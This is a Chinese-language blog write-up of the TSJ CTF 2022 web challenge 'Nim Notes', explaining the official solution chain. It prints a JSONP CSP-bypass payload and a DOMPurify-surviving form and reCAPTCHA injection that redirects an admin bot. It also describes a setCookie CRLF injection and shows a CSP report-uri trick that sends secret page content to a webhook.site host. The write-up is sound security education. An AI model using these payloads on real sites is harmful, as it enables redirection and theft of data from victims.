---
title: TSJ CTF 2022 - web/Nim Notes 筆記
catalog: true
date: 2022-03-02 22:02:11
tags: [Security]
categories: [Security]
---

上個週末除了有我上一篇心得寫的 SUSCTF 2022 以外，還有另外一個 TSJ CTF，裡面也有很多好題，因為時間不太夠所以我只有挑了自己比較有興趣的題目來看，就是標題說的這題 Nim Notes，最後沒解開（還差得遠呢），但解法十分有趣，因此寫一篇來記錄一下官方解法。

作者（maple3142）的 writeup 在這：https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes

<!-- more -->

## 題目介紹與解法

題目敘述：

> I made this note taking web app in Nim as a part of learning it. If you have some cool notes about Nim please share it with me!

簡單來說又是一個 CTF 常見的 note taking web app，登入之後可以新增筆記，也可以回報自己的筆記頁面給 admin bot。這題在 render 筆記頁面時，不是從後端直接吐資料，而是從前端打 API 去拿，再 render 在畫面上。

筆記頁面的 HTML 長這樣：

``` html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<link rel="stylesheet" href="/css/bootstrap.min.css" />
		<title>Notes</title>
	</head>
	<body class="d-flex flex-column min-vh-100">
		<!-- navbar -->
		<nav class="navbar navbar-expand-lg navbar-dark bg-dark mb-3">
			<div class="container-fluid">
				<span class="navbar-brand mb-0 h1">Notes</span>
				<ul class="navbar-nav">
					<li class="nav-item">
						<a class="nav-link" id="share-btn" href="javascript:void">Share To Admin</a>
					</li>
					<li class="nav-item">
						<a class="nav-link" id="logout-btn" href="javascript:void">Logout</a>
					</li>
				</ul>
			</div>
		</nav>

		<!-- editing area -->
		<div class="container">
			<div class="row justify-content-md-center">
				<div class="col-8">
					<div class="mb-3">
						<input id="title" class="form-control" placeholder="Title" />
						<textarea
							id="content"
							class="form-control"
							placeholder="e.g. I learned how to use `template` in Nim today :)"
						></textarea>
						<div class="d-grid gap-2">
							<button class="btn btn-primary" id="add-btn">Add</button>
						</div>
					</div>
				</div>
			</div>
		</div>

		<!-- note template -->
		<template id="note-tmpl">
			<div class="col-4">
				<div class="card">
					<div class="card-body">
						<h5 class="note-title card-title">title</h5>
						<h6 class="note-author card-subtitle mb-2 text-muted">author</h6>
						<p class="note-content card-text">text</p>
					</div>
				</div>
			</div>
		</template>

		<!-- note container -->
		<div class="container">
			<div class="row" id="notes-container"></div>
		</div>

		<!-- footer -->
		<div class="d-flex justify-content-md-center mt-auto">
			<p>&copy; 2022-2087 All rights reserved.</p>
		</div>

		<!-- hidden logout form-->
		<form hidden="true" id="logout-form" action="/logout" method="post"></form>

		<!-- scripts and recaptcha -->
		<div class="g-recaptcha" data-sitekey="$#" data-callback="tokenCallback" data-size="invisible"></div>
		<script src="/js/purify.min.js"></script>
		<script src="/js/marked.min.js"></script>
		<script src="/js/app.js"></script>
		<script async src="https://www.google.com/recaptcha/api.js"></script>
	</body>
</html>
```

重點在於 app.js，主要邏輯都在裡面：

``` js
// rendering notes
const container = document.getElementById('notes-container')
function createNote(note) {
	const el = document.importNode(document.getElementById('note-tmpl').content, true)
	el.querySelector('.note-title').textContent = note.title
	el.querySelector('.note-author').textContent = note.author
	el.querySelector('.note-content').innerHTML = DOMPurify.sanitize(marked.parse(note.content))
	return el
}
function loadNotes() {
	container.textContent = ''
	fetch('/api/notes' + location.search)
		.then(r => r.json())
		.then(notes => {
			container.append(...notes.map(createNote))
		})
}

// submitting notes
const titleEl = document.getElementById('title')
const contentEl = document.getElementById('content')
function trySubmit() {
	const title = titleEl.value
	const content = contentEl.value
	if (title && content) {
		fetch('/api/notes', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({ title, content })
		})
			.then(r => r.json())
			.then(r => {
				if (r.status === 'ok') {
					titleEl.value = ''
					contentEl.value = ''
					loadNotes()
				} else {
					alert(r.msg)
				}
			})
	}
}
const addBtn = document.getElementById('add-btn')
addBtn.addEventListener('click', trySubmit)

// logout btn
function logout() {
	document.getElementById('logout-form').submit()
}
const logoutBtn = document.getElementById('logout-btn')
logoutBtn.addEventListener('click', logout)

// share to admin btn
function tokenCallback(token) {
	fetch('/api/share', {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		body: JSON.stringify({ token })
	})
		.then(r => r.json())
		.then(r => {
			if (r.status === 'ok') {
				alert('Admin will view your note later!')
			} else {
				alert('Sorry, you need to pass recaptcha')
			}
		})
}
function share() {
	grecaptcha.execute()
}
const shareBtn = document.getElementById('share-btn')
shareBtn.addEventListener('click', share)

// init
loadNotes()
```

唯一可以注入的點在這邊：`el.querySelector('.note-content').innerHTML = DOMPurify.sanitize(marked.parse(note.content))`，但因為有經過 `DOMPurify.sanitize`，所以沒辦法直接 XSS，而這題的 CSP 也滿嚴格的：

```
default-src 'self'; script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; frame-src https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;
```

script 基本上只能引入自己或是 reCAPATCHA 的，沒有 `unsafe-inline` 可以用，其他東西像是 style 也被封死，所以也不會是 CSS injection。我嘗試找了一下 DOM clobbering 能不能幹嘛，但看了一下沒找到可以利用的地方。

原本看到這個 CSP，我以為 `https://www.google.com/recaptcha/` 的地方可以用 `%2f` 來繞過，例如說 [JSONBee](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) 上面有個 google.com 的 JSONP payload：

``` html
<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
```

如果把網址改成：`https://www.google.com/recaptcha/..%2fcomplete/search?client=...`，瀏覽器會過 CSP，而有些伺服器會把 `..%2f` 解讀成 `../`，所以就會是我們上面的 endpoint。不過實際嘗試過後發現這招對 google 行不通，只會回傳一個 404 not found，所以無法利用。

總之呢，大概卡了一兩個小時，連第一步怎麼開始都找不到。

後來官方有給了兩個提示，第一個提示是說第一步要先讓 admin bot 可以訪問到自己的網站，因此筆記頁面應該有個可以重新導向的漏洞。第二個則是明顯提示第一步的關鍵在 reCAPATCHA，仔細看文件就會找到答案。

從[文件](https://developers.google.com/recaptcha/docs/display#render_param)中不難發現有個屬性可以利用：`data-error-callback`，描述是：

> Optional. The name of your callback function, executed when reCAPTCHA encounters an error (usually network connectivity) and cannot continue until connectivity is restored. If you specify a function here, you are responsible for informing the user that they should retry.

當 reCAPTCHA 載入失敗的時候，就會呼叫這個屬性寫的 function，所以下一步就是看程式碼中有哪些 function 可以利用，找到了這個：

``` js
function logout() {
	document.getElementById('logout-form').submit()
}
```

原本的 logout-form 的位置在筆記插入的位置下面，所以我們可以用別的 form 把它蓋掉。

因為 DOMPurify 預設不會過濾 form，也不會過濾 `data-` 開頭的屬性，所以可以用下面這段 HTML 來讓網頁重新導向：

``` html
<form action="https://example.com" id="logout-form"></form>
<div class="g-recaptcha" data-sitekey="A" data-error-callback="logout" data-size="invisible"></div>
```

第一階段就這樣完成了，可以把 admin bot 導到任意頁面，當初看完提示解到這邊我就卡住了，看很久看不出下一步可以做什麼。

看了一下解答，第二階段是 `setCookie` 的 CRLF injection，但因為注入的點在 CSP header 下面，所以沒辦法 disable CSP，因此就算你可以控制 response，理論上也沒辦法 XSS，這時候就來到了第三階段。

在講第三階段之前先提一下非預期解，破除了「理論上沒辦法 XSS」這個前提，原因出在 nim 的 sqlite library 在內容含有 `\0` 的時候會爆炸，爆炸之後會直接噴錯誤訊息而且沒有 CSP header，就得到了一個開心的 XSS。

繼續講回精彩的第三階段。

第三階段是利用 [Content-Security-Policy-Report-Only](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only) 這個 header 來 leak flag，主要是因為違反規則時，會發送一段 JSON 到 server，其中有個 `script-sample`，如果是 inline script 違反的話會有前 40 個字元（還有一個前提，那就是 CSP 要加上 `report-sample`）。

我們可以自己弄個簡單的 server 來驗證：

``` js
const express = require('express')
const app = express()

app.get('/abc', (req, res) => {
  res.header('Content-Security-Policy', "default-src 'self'; script-src 'self';")
  res.header('Content-Security-Policy-Report-Only', "script-src 'report-sample'; report-uri https://webhook.site/419d518f-922b-4e1e-8583-65596fae1c95")
  
  res.send(`
    <body>
      <h1>hello</h1>
      <script>flag{test_flag}</script>
    </body>
  `)
  res.end()
})

app.listen(3000, () => {
  console.log('listening on http://localhost:3000')
})
```

從瀏覽器就可以看到送出去的 request 長怎樣：

```
{
  "csp-report": {
    "document-uri": "http://localhost:3000/abc",
    "referrer": "",
    "violated-directive": "script-src-elem",
    "effective-directive": "script-src-elem",
    "original-policy": "script-src 'report-sample'; report-uri https://webhook.site/419d518f-922b-4e1e-8583-65596fae1c95",
    "disposition": "report",
    "blocked-uri": "inline",
    "line-number": 4,
    "source-file": "http://localhost:3000/abc",
    "status-code": 200,
    "script-sample": "flag{test_flag}"
  }
}
```

靠著這個，就可以順利拿到 flag，打完收工。



## 其他可能性

在寫這篇的時候，我邊寫邊在每一個環節想有沒有其他可能性，但是在原題這麼嚴格的條件底下，能想到的路很有限，不過如果在原題上面做一些變化，放寬一些限制，倒是有其他可能。

### Open redirect

這個是原題不變的狀況下我唯一能想到的其他解法，就是找到 `https://www.google.com/recaptcha/` 或是 `https://www.gstatic.com/recaptcha/` 的 open redirect 或 JSONP，就可以繞過 CSP 去執行 JavaScript。

### CSS injection

假如 CSP 放寬，script 的部分一樣擋住，但是其他 style 相關的像是 style-src、font-src 跟 img-src 之類的都不擋的話，那在第三階段似乎有機會用 [CSS injection](https://web.archive.org/web/20240324012538/https://x-c3ll.github.io/posts/CSS-Injection-Primitives/) 的方式把 flag 慢慢 leak 出來。

